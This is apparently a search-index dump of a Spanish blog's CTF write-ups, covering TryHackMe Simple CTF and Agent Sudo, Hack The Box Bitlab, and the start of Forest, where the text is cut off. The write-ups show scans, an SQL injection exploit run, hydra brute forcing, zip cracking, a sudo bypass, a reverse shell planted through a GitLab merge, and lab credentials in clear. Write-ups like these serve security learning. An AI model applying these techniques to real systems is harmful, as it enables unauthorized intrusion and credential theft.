usuario y contraseña.\nCMS Made Simple \u0026lt; 2.2.10 - SQL Injection\n1 2 3 4 5 6 7  python CVE-2019-9053.py -u http://10.10.2.28/simple/ --crack -w 10k-most-common.txt [+] Salt for password found: 1dac0d9***fa6bb2 [+] Username found: mitch [+] Email found: admin@admin.com [+] Password found: 0c01f4468b*****a84c7eb73846e8d96 [+] Password cracked: ******   Intentamos utilizar las credenciales que encontramos en el panel de Made Simple pero no logramos iniciar sesion.\nSSH - User Utilizamos las credenciales que encontramos en el servicio SSH para poder obtener una shell y nuestra flag user.txt.\nPRIVILEGE ESCALATION Hacemos una enumeracion sencilla con sudo -l -l para listar los comandos/archivos que podemos ejecutar sin contraseña y con privilegios root, vemos a /usr/bin/vim, para obtener una shell utilizamos GTFOBINS.\nObtenemos nuestra shell con usuario root y nuestra flag root.txt.\n","description":"Simple CTF es una maquina de TryHackMe, en CMS Made Simple enocntramos credenciales las cuales nos dieron acceso por SSH. Con Vim e informacion de GTFOBins obtuvimos acceso privilegiado.","id":114,"section":"posts","tags":["ftp","CMS Made Simple","vim"],"title":"TryHackMe - Simple CTF","uri":"https://sckull.github.io/posts/simplectfthm/"},{"content":"  Agent Sudo es una maquina de TryHackMe, utilizamos burpsuite para encontrar el nombre de uno de los agentes seguidamente de un usuario, hydra para obtener acceso al servicio FTP, finalmente un reto de esteganografia para obtener las credenciales de acceso a la maquina. Mediante una vulnerabilidad en Sudo obtuvimos acceso root.\nRoom    Titulo Agent Sudo      Descripción You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.   Puntos 840   Dificultad Facil   Maker DesKel     NMAP Escaneo de puertos tcp/udp, nmap nos muestra el puerto http (80), el puerto ssh (22) y el puerto ftp (21) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  # Nmap 7.80 scan initiated Tue Feb 4 21:35:26 2020 as: nmap -p- -sV -sC -T4 -o nmap_scan 10.10.235.45 Nmap scan report for 10.10.235.45 Host is up (0.20s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA) | 256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA) |_ 256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Annoucement Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Feb 4 21:43:52 2020 -- 1 IP address (1 host up) scanned in 506.11 seconds   HTTP WHATWEB Esca corriendo una pagina sobre apache 2.4.29.\n1 2 3  root@aoiri:~/tryhackme/agentsudo# whatweb http://10.10.235.45 http://10.10.235.45 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.235.45], Title[Annoucement] root@aoiri:~/tryhackme/agentsudo#   GOBUSTER Utilizamos gobuster para busqueda de directorios y archivos que nos pudiesen servir.\n1 2 3 4  root@aoiri:~/tryhackme/agentsudo# gobuster dir -u 10.10.235.45 -w /usr/share/wordlists/dirb/common_nofirst10.txt -x php,html,txt -t 15 -q /index.php (Status: 200) /index.php (Status: 200) /server-status (Status: 403)   HTTP Web Al visitar la pagina encontramos un mensaje, en el cual nos mencionan el user-agent y que debemos de utilizar nuestro nombre en codigo para acceder.\nUtilizamos \u0026lsquo;R\u0026rsquo; en User-Agent y nos muestra un mensaje distinto.\nUtilizamos BURPSUITE para poder realizar distintas peticiones con el \u0026lsquo;User-Agent\u0026rsquo; utilizando como payloads:\n1 2 3  \u0026gt;\u0026gt;\u0026gt; import string \u0026gt;\u0026gt;\u0026gt; print string.printable 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\u0026#34;#$%\u0026amp;\u0026#39;()*+,-./:;\u0026lt;=\u0026gt;?@[\\]^_`{|}~   Encontramos que existe el Agente C, el contenido solo puede ser visto en nuestro navegador ya que nos redirige hacia otra pagina.\nAgente C:\nNos muestra un mensaje que muestra el nombre del agente \u0026lsquo;chris\u0026rsquo;.\nFTP Para poder acceder al servicio de FTP utilizamos hydra para realizar fuerza bruta a la contraseña con el usuario chris.\n1 2 3 4 5 6 7 8 9 10  root@aoiri:~/tryhackme/agentsudo# hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.235.45 Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-02-04 22:13:47 [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task [DATA] attacking ftp://10.10.235.45:21/ [STATUS] 240.00 tries/min, 240 tries in 00:01h, 14344159 to do in 996:08h, 16 active [21][ftp] host: 10.10.235.45 login: chris password: ******* 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-02-04 22:14:56   Al acceder nos encontramos con varios archivos:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  root@aoiri:~/tryhackme/agentsudo# ftp 10.10.235.45 Connected to 10.10.235.45. 220 (vsFTPd 3.0.3) Name (10.10.235.45:root): chris 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rw-r--r-- 1 0 0 217 Oct 29 12:15 To_agentJ.txt -rw-r--r-- 1 0 0 33143 Oct 29 12:22 cute-alien.jpg -rw-r--r-- 1 0 0 34842 Oct 29 12:33 cutie.webp 226 Directory send OK. ftp\u0026gt; mget * mget To_agentJ.txt? y 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes). 226 Transfer complete. 217 bytes received in 0.00 secs (1.3526 MB/s) mget cute-alien.jpg? y 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for cute-alien.jpg (33143 bytes). 226 Transfer complete. 33143 bytes received in 0.22 secs (145.3596 kB/s) mget cutie.webp? y 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for cutie.webp (34842 bytes). 226 Transfer complete. 34842 bytes received in 0.35 secs (95.8564 kB/s) ftp\u0026gt;   En el archivo de texto nos muestra un mensaje para el Agente J, en el que explica que la contraseña esta dentro de la imagen falsa.\n1 2 3 4 5 6 7  root@aoiri:~/tryhackme/agentsudo# cat To_agentJ.txt Dear agent J, All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn\u0026#39;t be a problem for you. From, Agent C   STEGO Utilizamos binwalk para ver el contenido de las imagenes y vemos que la imagen PNG tiene un archivo de texto.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  root@aoiri:~/tryhackme/agentsudo/tmp# binwalk cute-alien.jpg DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 JPEG image data, JFIF standard 1.01 root@aoiri:~/tryhackme/agentsudo/tmp# binwalk cutie.webp DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 PNG image, 528 x 528, 8-bit colormap, non-interlaced 869 0x365 Zlib compressed data, best compression 34562 0x8702 Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt 34820 0x8804 End of Zip archive, footer length: 22 root@aoiri:~/tryhackme/agentsudo/tmp#   Extraemos el contenido de la imagen con binwalk y encontramos un archivo comprimido que contiene el archivo de texto, utilizamos john the ripper para obtener la contraseña por fuerza bruta.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  root@aoiri:~/tryhackme/agentsudo/tmp/_cutie.webp.extracted# zip2john 8702.zip \u0026gt; hash_zip ver 81.9 8702.zip/To_agentR.txt is not encrypted, or stored with non-handled compression type root@aoiri:~/tryhackme/agentsudo/tmp/_cutie.webp.extracted# cat hash_zip 8702.zip/To_agentR.txt:$zip2$*0*1*0*4673cae714579045*67aa*4e[... hash-here-dont-show-cuz-tryhackme-ban-me-:v-end ...]*$/zip2$:To_agentR.txt:8702.zip:8702.zip root@aoiri:~/tryhackme/agentsudo/tmp/_cutie.webp.extracted# john hash_zip Using default input encoding: UTF-8 Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x]) Will run 2 OpenMP threads Proceeding with single, rules:Single Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status Almost done: Processing the remaining buffered candidate passwords, if any. Warning: Only 10 candidates buffered for the current salt, minimum 16 needed for performance. Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist ***** (8702.zip/To_agentR.txt) 1g 0:00:00:00 DONE 2/3 (2020-02-04 22:58) 1.052g/s 46303p/s 46303c/s 46303C/s 123456..Peter Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed root@aoiri:~/tryhackme/agentsudo/tmp/_cutie.webp.extracted#   Extraemos los archivos del archivo zip:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  root@aoiri:~/tryhackme/agentsudo/tmp/_cutie.webp.extracted# 7z x 8702.zip 7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21 p7zip Version 16.02 (locale=en_US.utf8,Utf16=on,HugeFiles=on,64 bits,2 CPUs Intel(R) Core(TM) i5-8250U CPU @ 1.60GHz (806EA),ASM,AES-NI) Scanning the drive for archives: 1 file, 280 bytes (1 KiB) Extracting archive: 8702.zip -- Path = 8702.zip Type = zip Physical Size = 280 Enter password (will not be echoed): ***** Everything is Ok Size: 86 Compressed: 280 root@aoiri:~/tryhackme/agentsudo/tmp/_cutie.webp.extracted# ls 365 365.zlib 8702.zip hash_zip To_agentR.txt   Vemos un mensaje que nos muestra la contraseña de la que nos mencionaba la anterior nota:\n1 2 3 4 5 6 7 8  root@aoiri:~/tryhackme/agentsudo/tmp/_cutie.webp.extracted# cat To_agentR.txt Agent C, We need to send the picture to \u0026#39;*******\u0026#39; as soon as possible! By, Agent R root@aoiri:~/tryhackme/agentsudo/tmp/_cutie.webp.extracted#   Utilizamos la contraseña (decodificada en base64) para obtener los archivos de la imagen JPG:\n1 2 3 4 5 6 7 8 9 10 11 12 13  root@aoiri:~/tryhackme/agentsudo/tmp# steghide extract -sf cute-alien.jpg Enter passphrase: wrote extracted data to \u0026#34;message.txt\u0026#34;. root@aoiri:~/tryhackme/agentsudo/tmp# cat message.txt Hi james, Glad you find this message. Your login password is ************ Don\u0026#39;t ask me why the password look cheesy, ask agent R who set this password for you. Your buddy, chris root@aoiri:~/tryhackme/agentsudo/tmp#   SSH - User Ahora que tenemos las credenciales, las utilizamos con el servicio SSH de la maquina, obtenemos nuestra shell y nuestra flag user.txt.\nPRIVILEGE ESCALATION Hacemos una enumeracion sencilla con sudo -l para listar los comandos/archivos que podemos ejecutar sin contraseña y con privilegios root, vemos /bin/bash pero al intentar ejecutarlo con sudo no se ejecuta.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  james@agent-sudo:~$ sudo -l -l [sudo] password for james: Matching Defaults entries for james on agent-sudo: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User james may run the following commands on agent-sudo: Sudoers entry: RunAsUsers: ALL, !root Commands: /bin/bash james@agent-sudo:~$ sudo /bin/bash Sorry, user james is not allowed to execute \u0026#39;/bin/bash\u0026#39; as root on agent-sudo. james@agent-sudo:~$   Buscamos una vulnerabilidad para sudo y vemos que existe un exploit con el cual podemos obtener acceso de superusuario.\nsudo 1.8.27 - Security Bypass\nDescargamos el exploit, lo ejecutamos, obtenemos nuestra shell y nuestra flag root.txt.\n","description":"Agent Sudo es una maquina de TryHackMe, utilizamos burpsuite para encontrar el nombre de uno de los agentes seguidamente de un usuario, hydra para obtener acceso al servicio FTP, finalmente un reto de esteganografia para obtener las credenciales de acceso a la maquina. Mediante una vulnerabilidad en Sudo obtuvimos acceso root.","id":115,"section":"posts","tags":["ftp","steganography","steghide","binwalk","sudo privesc"],"title":"TryHackMe - Agent Sudo","uri":"https://sckull.github.io/posts/agent_sudo/"},{"content":"  Bitlab corre GitLab, encontramos credenciales en codigo ofuscado de JavaScript para obtener acceso modificamos un repositorio. Ralizar un query a la base de datos Postgres nos permitio obtener credenciales para el movimiento lateral. Ollydbg nos permitio encontrar credenciales dentro de un ejecutable para escalar privilegios.\nInformacion de la Maquina    Nombre Bitlab      OS Linux   Puntos 30   Dificultad Media   IP 10.10.10.114   Maker Freythek    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[7.4, 7.4, 4.6, 5.4, 2.6], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[10, 10, 6, 4, 0], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     MASSCAN \u0026amp; NMAP Escaneo de puerto tcp/udp, en el cual nos muestra el puerto http (80) y el puerto de ssh (22) abierto.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42  root@kali:~/htb/bitlab# masscan -p1-65535,U:1-65535 10.10.10.114 --rate=1000 -e tun0 Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-09-24 23:21:55 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 80/tcp on 10.10.10.114 Discovered open port 22/tcp on 10.10.10.114 root@kali:~/htb/bitlab# nmap -p- --min-rate 1000 10.10.10.114 Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-24 19:23 EDT Nmap scan report for 10.10.10.114 Host is up (0.34s latency). Not shown: 65533 filtered ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 133.40 seconds # Nmap 7.80 scan initiated Tue Sep 24 19:26:19 2019 as: nmap -sV -sC -p22,80 -o nmap.scan 10.10.10.114 Nmap scan report for 10.10.10.114 Host is up (0.083s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 a2:3b:b0:dd:28:91:bf:e8:f9:30:82:31:23:2f:92:18 (RSA) | 256 e6:3b:fb:b3:7f:9a:35:a8:bd:d0:27:7b:25:d4:ed:dc (ECDSA) |_ 256 c9:54:3d:91:01:78:03:ab:16:14:6b:cc:f0:b7:3a:55 (ED25519) 80/tcp open http nginx | http-robots.txt: 55 disallowed entries (15 shown) | / /autocomplete/users /search /api /admin /profile | /dashboard /projects/new /groups/new /groups/*/edit /users /help |_/s/ /snippets/new /snippets/*/edit | http-title: Sign in \\xC2\\xB7 GitLab |_Requested resource was http://10.10.10.114/users/sign_in |_http-trane-info: Problem with XML parsing of /evox/about Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Sep 24 19:26:30 2019 -- 1 IP address (1 host up) scanned in 11.04 seconds   HTTP Dentro del servicio de http nos muestra un panel de inicio de sesion de lo que parece gitlab.\nRobots.txt\nDentro del archivo robots.txt encontramos diferentes rutas en las cuales la mayoria nos redirige a /users/sign_in, en la unica en la que podemos navegar es en /explore pero en esta ruta no encontramos nada interesante.\nAl visitar distintas rutas dentro de esta pagina encontramos que en /help hay un archivo de html que al visitarlo contiene direcciones hacia otra pagina, menos la ultima que contiene codigo javascript codificado.\nBookmarks.html\nCodigo javascript:\n1  javascript:(function(){ var _0x4b18=[\u0026#34;\\x76\\x61\\x6C\\x75\\x65\u0026#34;,\u0026#34;\\x75\\x73\\x65\\x72\\x5F\\x6C\\x6F\\x67\\x69\\x6E\u0026#34;,\u0026#34;\\x67\\x65\\x74\\x45\\x6C\\x65\\x6D\\x65\\x6E\\x74\\x42\\x79\\x49\\x64\u0026#34;,\u0026#34;\\x63\\x6C\\x61\\x76\\x65\u0026#34;,\u0026#34;\\x75\\x73\\x65\\x72\\x5F\\x70\\x61\\x73\\x73\\x77\\x6F\\x72\\x64\u0026#34;,\u0026#34;\\x31\\x31\\x64\\x65\\x73\\x30\\x30\\x38\\x31\\x78\u0026#34;];document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]]= _0x4b18[3];document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]]= _0x4b18[5]; })()   Codigo decodificado:\n1 2 3 4 5 6  javascript:(function(){ document[\u0026#34;getElementById\u0026#34;](\u0026#34;user_login\u0026#34;)[\u0026#34;value\u0026#34;]= \u0026#34;clave\u0026#34;; document[\u0026#34;getElementById\u0026#34;](\u0026#34;user_password\u0026#34;)[\u0026#34;value\u0026#34;]= \u0026#34;11des0081x\u0026#34;\u0026#34;; } )()   GitLab Login Utilizamos las credenciales clave:11des0081x para iniciar sesion y vemos que hay diferentes proyectos dentro de gitlab.\nSHELL - Gitlab / Profile Dentro de los repositorios encontramos uno que tiene como nombre Profile, dentro de este repositorio se encuentra un archivo php (index.php) en el cual podemos ver codigo que pertenece a la pagina /profile/.\nindex.php /profile Realizamos un cambio dentro del codigo de index.php y realizamos un merge para intentar modificar la pagina /profile.\nindex.php merge\nPodemos observar que en la pagina de profile se encuentra nuestro codigo con el texto que insertamos.\nAhora que sabemos que podemos modificar codigo dentro de la pagina index, vamos a intentar crear un archivo en el repositorio con una shell inversa.\nhello.php\nexecInBackground\nnetcat\nObtenemos una shell como usuario www-data.\nSnippet - Postgres Dentro de gitlab tambien encontramos un snippet que contiene nombre, usuario y contraseña para una base de datos en postgres.\nCodigo:\n1 2 3  \u0026lt;?php $db_connection = pg_connect(\u0026#34;host=localhost dbname=profiles user=profiles password=profiles\u0026#34;); $result = pg_query($db_connection, \u0026#34;SELECT * FROM profiles\u0026#34;);   Utilizamos la porcion de codigo para ejecutarlo dentro de la maquina con php, agregando una porcion de codigo para obtener el resultado del query de la tabla profiles.\n1 2 3 4 5 6  \u0026lt;?php $db_connection = pg_connect(\u0026#34;host=localhost dbname=profiles user=profiles password=profiles\u0026#34;); $result = pg_query($db_connection, \u0026#34;SELECT * FROM profiles\u0026#34;); $arr = pg_fetch_all($result); print_r($arr); ?\u0026gt;   Codigo ejecutado:\nAl ejecutar el codigo nos devuelve un usuario y contraseña, la contraseña codificada en base64.\nCredenciales:\nclave:c3NoLXN0cjBuZy1wQHNz== clave:ssh-str0ng-p@ss SHELL - Usuario clave Actualizamos nuestra shell al intentar ingresar con la contraseña decodificada no la aceptó, utilizamos la codificada y obtuvimos shell como usuario clave.\nY Nuestra flag user.txt.\nRE - RemoteConnection.exe Dentro de la carpeta principal del usuario clave encontramos un archivo exe, trasladamos el archivo a nuestra maquina local para poder analizar el archivo.\nUtilizamos ollydbg en su version 2.01 agregamos nuestro ejecutable en la interfaz de olly.\nAl correr nuestro ejecutable nos muestra un mensaje en la ventana de ejecucion del archivo (Acceso Denegado).\nBuscamos el mensaje que nos muestra en la ventana haciendo click dentro de la ventana Search for \u0026gt; All References Strings.\nEncontramos varios mensajes (strings) vemos una string que es distinta a las demas colocamos un breakpoint en el string y volvemos a ejecutar y presionar F8.\nVemos nuestro breakpoint.\nVemos la conexion con el usuario root hacia la maquina de bitlab con la contraseña.\nCredenciales:\n-ssh root@gitlab.htb -pw Qf7]8YSV.wDNF*[7d?j\u0026amp;eD4^\u0026quot; root:Qf7]8YSV.wDNF*[7d?j\u0026amp;eD4^\u0026quot; Utilizamos las credenciales y obtenemos una shell con el usuario root y nuestra flag root.txt.\n","description":"Bitlab corre GitLab, encontramos credenciales en codigo ofuscado de JavaScript para obtener acceso modificamos un repositorio. Ralizar un query a la base de datos Postgres nos permitio obtener credenciales para el movimiento lateral. Ollydbg nos permitio encontrar credenciales dentro de un ejecutable para escalar privilegios.","id":116,"section":"posts","tags":["ollydbg","gitlab","javascript","deofuscation","postgresql"],"title":"Hack The Box - Bitlab","uri":"https://sckull.github.io/posts/bitlab/"},{"content":"  Forest de HackThebox. Encontramos una lista de usuarios con enum4linux los cuales utilizamos con Impacket para realizar AS-REP Roasting attack con lo cual obtuvimos credenciales y acceso por WinRM. Con BloodHound enumeramos y con Aclpwn obtuvimos privilegios administrativos para luego dumpear los hashes y finalmente realizar Pass-the-Hash para obtener una shell como administrador.\nInformacion de la Maquina    Nombre Forest      OS Windows   Puntos 20   Dificultad Facil   IP 10.10.10.161   Maker egre55mrb3n    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[8.1, 8.6, 6.8, 3.2, 1.4], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[7, 10, 8, 2, 0], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     MASSCAN \u0026amp; NMAP Escaneo de puerto tcp/udp, en el cual nos muestra varios puertos abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124  root@kali:~/htb/forest# masscan -p1-65535,U:1-65535 10.10.10.161 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-10-25 04:57:31 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 135/tcp on 10.10.10.161 Discovered open port 464/tcp on 10.10.10.161 Discovered open port 49910/tcp on 10.10.10.161 Discovered open port 58925/udp on 10.10.10.161 Discovered open port 445/tcp on 10.10.10.161 Discovered open port 139/tcp on 10.10.10.161 Discovered open port 49664/tcp on 10.10.10.161 Discovered open port 9389/tcp on 10.10.10.161 Discovered open port 49671/tcp on 10.10.10.161 Discovered open port 49666/tcp on 10.10.10.161 Discovered open port 3269/tcp on 10.10.10.161 Discovered open port 593/tcp on 10.10.10.161 Discovered open port 49667/tcp on 10.10.10.161 Discovered open port 49676/tcp on 10.10.10.161 Discovered open port 49703/tcp on 10.10.10.161 Discovered open port 49684/tcp on 10.10.10.161 Discovered open port 53/tcp on 10.10.10.161 # Nmap 7.70 scan initiated Fri Oct 25 01:01:38 2019 as: nmap -p- --min-rate 1000 -o nmap.scan 10.10.10.161 Warning: 10.10.10.161 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.161 Host is up (0.23s latency). Not shown: 63731 closed ports, 1780 filtered ports PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 9389/tcp open adws 47001/tcp open winrm 49664/tcp open unknown 49665/tcp open unknown 49666/tcp open unknown 49667/tcp open unknown 49671/tcp open unknown 49676/tcp open unknown 49677/tcp open unknown 49684/tcp open unknown 49703/tcp open unknown 49910/tcp open unknown # Nmap done at Fri Oct 25 01:06:47 2019 -- 1 IP address (1 host up) scanned in 308.58 seconds # Nmap 7.70 scan initiated Fri Oct 25 01:08:05 2019 as: nmap -sV -sC -p- --min-rate 1000 -o script_nmap.scan 10.10.10.161 Warning: 10.10.10.161 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.161 Host is up (0.26s latency). Not shown: 64311 closed ports, 1201 filtered ports PORT STATE SERVICE VERSION 53/tcp open domain? | fingerprint-strings: | DNSVersionBindReqTCP: | version |_ bind 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2019-10-25 05:20:03Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49671/tcp open msrpc Microsoft Windows RPC 49676/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49677/tcp open msrpc Microsoft Windows RPC 49684/tcp open msrpc Microsoft Windows RPC 49703/tcp open msrpc Microsoft Windows RPC 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port53-TCP:V=7.70%I=7%D=10/25%Time=5DB2843D%P=x86_64-pc-linux-gnu%r(DNS SF:VersionBindReqTCP,20,\u0026#34;\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07version SF:\\x04bind\\0\\0\\x10\\0\\x03\u0026#34;); Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 2h27m49s, deviation: 4h02m51s, median: 7m36s | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: FOREST | NetBIOS computer name: FOREST\\x00 | Domain name: htb.local | Forest name: htb.local | FQDN: FOREST.htb.local |_ System time: 2019-10-24T22:23:05-07:00 | smb-security-mode: | account_used: \u0026lt;blank\u0026gt; | authentication_level: user | challenge_response: supported |_ message_signing: required | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2019-10-25 01:22:33 |_ start_date: 2019-10-25 00:22:54 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Oct 25 01:16:55 2019 -- 1 IP address (1 host up) scanned in 529.48 seconds   ENUM4LINUX Vemos que tenemos muchos puertos por enumerar 